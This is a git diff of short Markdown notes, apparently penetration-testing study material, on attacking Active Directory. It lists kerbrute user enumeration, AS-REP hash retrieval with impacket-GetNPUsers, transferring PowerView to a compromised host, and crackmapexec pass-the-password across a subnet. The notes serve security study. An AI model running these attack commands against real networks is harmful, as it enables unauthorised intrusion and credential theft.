@@ -35,7 +35,9 @@
 2. `kerbrute userenum --dc $IP -d DOMAIN.NAME user.txt` user.txt is a userlist that we have created to authenticate to DC.
 3. `impacket-GetNPUsers -userfile user.txt -dc-ip $IP DOMAIN.NAME/`
 4. Crack the hash
-
+## After initial shell, credentials or some password
+1. Enumerate the initial target using powerview. Trasfer file to target.
+2. https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
 ## Pass the Password Attack
 1. Lets say we have some credentials. Lets try to pass the password/hash to other connected networks. 
 2. `crackmapexec 192.168.119.0/24 -u SOMEUSERNAME -d DOMAIN.LOCAL -p SOMEPASSWORD` 
